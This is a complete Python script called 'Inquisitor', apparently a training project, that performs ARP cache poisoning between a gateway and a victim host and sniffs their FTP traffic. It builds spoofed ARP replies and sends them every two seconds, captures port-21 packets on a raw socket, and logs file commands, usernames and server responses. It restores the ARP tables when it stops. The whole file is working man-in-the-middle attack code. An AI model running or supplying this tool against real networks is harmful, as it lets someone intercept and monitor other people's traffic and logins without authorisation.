#!/usr/bin/env python3
"""
Inquisitor - ARP Poisoning tool with FTP sniffing
Usage: python3 inquisitor.py <IP-src> <MAC-src> <IP-target> <MAC-target> [-v]
"""

import sys
import time
import signal
import struct
import socket
import binascii
import threading
import re

try:
    import pcap
except ImportError:
    try:
        import libpcap as pcap
    except ImportError:
        pcap = None

# ─── ARP constants ────────────────────────────────────────────────────────────
ETH_P_ARP  = 0x0806
ARP_REPLY  = 0x0002
HTYPE_ETH  = 0x0001
PTYPE_IPV4 = 0x0800

# ─── Globals ──────────────────────────────────────────────────────────────────
verbose    = False
running    = True
sock       = None
ip_src     = None
mac_src    = None
ip_target  = None
mac_target = None
our_mac    = None  # attacker's real MAC (read from interface)


# ══════════════════════════════════════════════════════════════════════════════
#  Helpers
# ══════════════════════════════════════════════════════════════════════════════

def mac_str_to_bytes(mac: str) -> bytes:
    """Convert 'aa:bb:cc:dd:ee:ff' → bytes."""
    mac = mac.strip()
    try:
        return bytes(int(x, 16) for x in mac.split(':'))
    except Exception:
        raise ValueError(f"Invalid MAC address: {mac!r}")


def ip_str_to_bytes(ip: str) -> bytes:
    """Convert '192.168.1.1' → bytes."""
    try:
        return socket.inet_aton(ip.strip())
    except OSError:
        raise ValueError(f"Invalid IPv4 address: {ip!r}")


def validate_ipv4(ip: str) -> bool:
    try:
        socket.inet_aton(ip.strip())
        return ip.count('.') == 3
    except OSError:
        return False


def get_interface() -> str:
    """Return the first non-loopback interface."""
    try:
        with open('/proc/net/dev') as f:
            for line in f:
                iface = line.strip().split(':')[0]
                if iface not in ('lo', 'bonding_masters') and ':' not in iface.split(':')[0]:
                    if iface.strip() and iface.strip() != 'Inter-':
                        candidate = iface.strip()
                        if candidate not in ('lo', 'Inter-', '|'):
                            return candidate
    except Exception:
        pass
    return 'eth0'


def get_our_mac(iface: str) -> bytes:
    """Read our hardware MAC from /sys/class/net/<iface>/address."""
    try:
        with open(f'/sys/class/net/{iface}/address') as f:
            return mac_str_to_bytes(f.read().strip())
    except Exception:
        # fallback: all zeros
        return b'\x00' * 6


def open_raw_socket(iface: str):
    """Open a raw Layer-2 socket bound to iface."""
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ARP))
    s.bind((iface, 0))
    return s


# ══════════════════════════════════════════════════════════════════════════════
#  ARP frame builder
# ══════════════════════════════════════════════════════════════════════════════

def build_arp_reply(
    eth_dst: bytes,   # Ethernet destination
    eth_src: bytes,   # Ethernet source  (our attacker MAC)
    arp_sender_mac: bytes,
    arp_sender_ip: bytes,
    arp_target_mac: bytes,
    arp_target_ip: bytes,
) -> bytes:
    """Build a raw Ethernet frame containing an ARP reply."""
    # Ethernet header (14 bytes)
    eth = struct.pack('!6s6sH', eth_dst, eth_src, ETH_P_ARP)

    # ARP payload (28 bytes)
    arp = struct.pack('!HHBBH6s4s6s4s',
        HTYPE_ETH,          # Hardware type: Ethernet
        PTYPE_IPV4,         # Protocol type: IPv4
        6,                  # HW addr length
        4,                  # Proto addr length
        ARP_REPLY,          # Opcode: reply
        arp_sender_mac,     # Sender MAC
        arp_sender_ip,      # Sender IP
        arp_target_mac,     # Target MAC
        arp_target_ip,      # Target IP
    )
    return eth + arp


# ══════════════════════════════════════════════════════════════════════════════
#  ARP poisoning loop
# ══════════════════════════════════════════════════════════════════════════════

def poison_loop(iface: str):
    """Send spoofed ARP replies in both directions every 2 seconds."""
    global running, sock
    global ip_src, mac_src, ip_target, mac_target, our_mac

    ip_src_b    = ip_str_to_bytes(ip_src)
    ip_target_b = ip_str_to_bytes(ip_target)
    mac_src_b   = mac_str_to_bytes(mac_src)
    mac_target_b = mac_str_to_bytes(mac_target)

    try:
        sock = open_raw_socket(iface)
    except PermissionError:
        print("[!] Root privileges required to open raw sockets.", file=sys.stderr)
        sys.exit(1)

    print(f"[*] Starting ARP poisoning on interface {iface}")
    print(f"    {ip_src} ({mac_src})  <-->  {ip_target} ({mac_target})")

    while running:
        # Tell ip_src  : ip_target is at OUR mac
        frame1 = build_arp_reply(
            eth_dst=mac_src_b,
            eth_src=our_mac,
            arp_sender_mac=our_mac,
            arp_sender_ip=ip_target_b,
            arp_target_mac=mac_src_b,
            arp_target_ip=ip_src_b,
        )
        # Tell ip_target: ip_src is at OUR mac
        frame2 = build_arp_reply(
            eth_dst=mac_target_b,
            eth_src=our_mac,
            arp_sender_mac=our_mac,
            arp_sender_ip=ip_src_b,
            arp_target_mac=mac_target_b,
            arp_target_ip=ip_target_b,
        )
        try:
            sock.send(frame1)
            sock.send(frame2)
        except Exception as e:
            if running:
                print(f"[!] Send error: {e}", file=sys.stderr)
        time.sleep(2)


# ══════════════════════════════════════════════════════════════════════════════
#  ARP table restoration
# ══════════════════════════════════════════════════════════════════════════════

def restore_arp(iface: str):
    """Send genuine ARP replies to both victims to fix their ARP caches."""
    global ip_src, mac_src, ip_target, mac_target

    ip_src_b     = ip_str_to_bytes(ip_src)
    ip_target_b  = ip_str_to_bytes(ip_target)
    mac_src_b    = mac_str_to_bytes(mac_src)
    mac_target_b = mac_str_to_bytes(mac_target)

    print("\n[*] Restoring ARP tables...")

    try:
        s = open_raw_socket(iface)
    except Exception:
        return

    for _ in range(5):
        # Restore ip_src's table: ip_target really is at mac_target
        frame1 = build_arp_reply(
            eth_dst=mac_src_b,
            eth_src=mac_target_b,
            arp_sender_mac=mac_target_b,
            arp_sender_ip=ip_target_b,
            arp_target_mac=mac_src_b,
            arp_target_ip=ip_src_b,
        )
        # Restore ip_target's table: ip_src really is at mac_src
        frame2 = build_arp_reply(
            eth_dst=mac_target_b,
            eth_src=mac_src_b,
            arp_sender_mac=mac_src_b,
            arp_sender_ip=ip_src_b,
            arp_target_mac=mac_target_b,
            arp_target_ip=ip_target_b,
        )
        try:
            s.send(frame1)
            s.send(frame2)
        except Exception:
            pass
        time.sleep(0.3)

    s.close()
    print("[*] ARP tables restored.")


# ══════════════════════════════════════════════════════════════════════════════
#  FTP sniffer (via raw socket / pcap)
# ══════════════════════════════════════════════════════════════════════════════

FTP_CMDS = {
    'RETR': 'GET  (download)',
    'STOR': 'PUT  (upload)',
    'STOU': 'PUT  (unique store)',
    'APPE': 'APPE (append)',
    'DELE': 'DELE (delete)',
    'RNFR': 'RNFR (rename from)',
    'RNTO': 'RNTO (rename to)',
    'MKD' : 'MKD  (mkdir)',
    'RMD' : 'RMD  (rmdir)',
    'LIST': 'LIST (list directory)',
    'NLST': 'NLST (name list)',
    'CWD' : 'CWD  (change dir)',
}

FTP_AUTH_CMDS = {'USER', 'PASS', 'ACCT'}

VERBOSE_IGNORE = {'NOOP', 'TYPE', 'MODE', 'STRU', 'PORT', 'PASV', 'EPSV', 'EPRT'}


def parse_ftp_payload(payload: bytes, src_ip: str, dst_ip: str):
    """Parse an FTP TCP payload and print relevant lines."""
    try:
        text = payload.decode('utf-8', errors='replace').strip()
    except Exception:
        return

    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue

        parts = line.split(None, 1)
        if not parts:
            continue
        cmd = parts[0].upper()
        arg = parts[1] if len(parts) > 1 else ''

        # Always show file-related commands
        if cmd in FTP_CMDS:
            print(f"[FTP] {src_ip} -> {dst_ip}  {FTP_CMDS[cmd]}: {arg}")

        # Verbose mode: show everything including auth + server responses
        elif verbose:
            if cmd in FTP_AUTH_CMDS:
                display = arg if cmd != 'PASS' else '***'
                print(f"[FTP] {src_ip} -> {dst_ip}  {cmd}: {display}")
            elif re.match(r'^\d{3}', cmd):
                # Server response code
                print(f"[FTP] {src_ip} -> {dst_ip}  Response: {line}")
            elif cmd not in VERBOSE_IGNORE:
                print(f"[FTP] {src_ip} -> {dst_ip}  {line}")


def sniff_ftp_raw(iface: str):
    """
    Sniff packets using a raw socket (AF_PACKET).
    Captures all traffic on the interface and filters FTP (port 21).
    """
    global running

    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
        s.bind((iface, 0))
        s.settimeout(1.0)
    except PermissionError:
        print("[!] Root required for packet capture.", file=sys.stderr)
        return

    print("[*] FTP sniffer started (port 21)...")

    while running:
        try:
            data = s.recv(65535)
        except socket.timeout:
            continue
        except Exception:
            break

        # Need at least Ethernet(14) + IP(20) + TCP(20)
        if len(data) < 54:
            continue

        # Ethernet header
        eth_proto = struct.unpack('!H', data[12:14])[0]
        if eth_proto != 0x0800:  # IPv4 only
            continue

        # IP header
        ip_start = 14
        ihl = (data[ip_start] & 0x0F) * 4
        proto = data[ip_start + 9]
        if proto != 6:  # TCP only
            continue

        src_ip = socket.inet_ntoa(data[ip_start + 12: ip_start + 16])
        dst_ip = socket.inet_ntoa(data[ip_start + 16: ip_start + 20])

        # TCP header
        tcp_start = ip_start + ihl
        if len(data) < tcp_start + 20:
            continue

        src_port = struct.unpack('!H', data[tcp_start:     tcp_start + 2])[0]
        dst_port = struct.unpack('!H', data[tcp_start + 2: tcp_start + 4])[0]

        if src_port != 21 and dst_port != 21:
            continue

        data_offset = ((data[tcp_start + 12] >> 4) & 0xF) * 4
        payload_start = tcp_start + data_offset

        if payload_start >= len(data):
            continue

        payload = data[payload_start:]
        if payload:
            parse_ftp_payload(payload, src_ip, dst_ip)

    s.close()


# ══════════════════════════════════════════════════════════════════════════════
#  Signal handler
# ══════════════════════════════════════════════════════════════════════════════

def signal_handler(sig, frame):
    global running
    running = False


# ══════════════════════════════════════════════════════════════════════════════
#  Entry point
# ══════════════════════════════════════════════════════════════════════════════

def usage():
    print("Usage: python3 inquisitor.py <IP-src> <MAC-src> <IP-target> <MAC-target> [-v]")
    print()
    print("  IP-src     : IP address of the source (e.g. the gateway)")
    print("  MAC-src    : MAC address of the source")
    print("  IP-target  : IP address of the target (victim)")
    print("  MAC-target : MAC address of the target")
    print("  -v         : Verbose mode (show all FTP traffic)")


def main():
    global verbose, ip_src, mac_src, ip_target, mac_target, our_mac, running

    args = sys.argv[1:]

    # Filter -v flag
    if '-v' in args:
        verbose = True
        args = [a for a in args if a != '-v']

    if len(args) != 4:
        usage()
        sys.exit(1)

    ip_src, mac_src, ip_target, mac_target = args

    # Validate IPv4
    if not validate_ipv4(ip_src):
        print(f"[!] Invalid IPv4 address: {ip_src}", file=sys.stderr)
        sys.exit(1)
    if not validate_ipv4(ip_target):
        print(f"[!] Invalid IPv4 address: {ip_target}", file=sys.stderr)
        sys.exit(1)

    # Validate MACs
    try:
        mac_str_to_bytes(mac_src)
        mac_str_to_bytes(mac_target)
    except ValueError as e:
        print(f"[!] {e}", file=sys.stderr)
        sys.exit(1)

    iface  = get_interface()
    our_mac = get_our_mac(iface)
    our_mac_str = ':'.join(f'{b:02x}' for b in our_mac)
    print(f"[*] Interface : {iface}  (our MAC: {our_mac_str})")
    print(f"[*] Verbose   : {'ON' if verbose else 'OFF'}")

    # Install signal handler for clean shutdown
    signal.signal(signal.SIGINT,  signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Start ARP poison thread
    poison_thread = threading.Thread(target=poison_loop, args=(iface,), daemon=True)
    poison_thread.start()

    # Start FTP sniffer thread
    sniff_thread = threading.Thread(target=sniff_ftp_raw, args=(iface,), daemon=True)
    sniff_thread.start()

    print("[*] Running — press Ctrl+C to stop.\n")

    # Main thread: just wait
    try:
        while running:
            time.sleep(0.5)
    except KeyboardInterrupt:
        running = False

    # Wait for threads to finish
    poison_thread.join(timeout=3)
    sniff_thread.join(timeout=3)

    # Restore ARP tables
    restore_arp(iface)
    print("[*] Done.")


if __name__ == '__main__':
    main()
